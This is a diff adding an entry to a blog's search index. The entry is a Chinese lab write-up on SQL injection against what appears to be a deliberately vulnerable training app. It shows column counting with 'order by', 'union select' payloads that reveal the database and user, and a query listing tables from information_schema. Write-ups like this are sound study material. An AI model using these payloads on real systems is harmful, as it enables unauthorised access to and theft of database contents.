@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>安全攻防综合实验8</title>
+    <link href="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/"/>
+    <url>/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/</url>
+    
+    <content type="html"><![CDATA[<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>可以通过查看我的之前的blog：<a href="https://jhl328.github.io/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/" target="_blank" rel="noopener">https://jhl328.github.io/2020/12/19/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/</a></p><p>首先，查看<code>source code</code></p><p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/1.png" srcset="/img/loading.gif" alt="1"></p><p>可以看到用的是<code>post</code>方法来获取参数，用户只能通过选择来进行，不能进行输入</p><p>当我们输入id（例如：1）之后，所构造的SQL的完整语句就是</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span>;</code></pre><p>意思是在名为<code>users</code>的表中找到<code>user_id</code>这个列中内容为<code>&quot;1&quot;</code>的那一条数据的<code>first_name</code>以及<code>last_name</code>的值</p><p>所以之后我们可以通过控制输入的参数id的值来调整执行的SQL语句</p><p>输入<code>1&#39; order by 1#</code>，此时php所要执行的SQL语句就变为了</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span><span class="hljs-comment">#';</span></code></pre><p>此时SQL会把#后面内容屏蔽来避免语句错误，但是此时会发现提示语法错误，会发现是由于’ 被转义为了\，之后注入的时候只需要输入<code>1 order by 1#</code>即可</p><p>同时测试<code>1 order by 2#</code>，发现也成功，但是到了order by 3#的时候，会发现出现错误，说明这个名为<code>users</code>的表应该是2列</p><p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/2.png" srcset="/img/loading.gif" alt="2"></p><p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/3.png" srcset="/img/loading.gif" alt="3"></p><p>接下来可以查看所有的数据库，输入<code>1 union select database(),user()</code></p><p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/4.png" srcset="/img/loading.gif" alt="4"></p><p>之后就能够通过上面相同的形式来查看表， <code>union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code></p><p><img src="/2021/11/09/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C8/5.png" srcset="/img/loading.gif" alt="5"></p><p>之后如果要查询当前表名的所有列，注意要进行转义，通过16进制可以实现</p><p>之后high在本质上只是通过⼀个中转的session，通过向这个session的url注⼊，报错回显显示在之前的那个url⽽已。其实做法都一样</p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>安全攻防综合实验</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>安全攻防综合实验7</title>
     <link href="/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/"/>
     <url>/2021/11/02/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C7/</url>
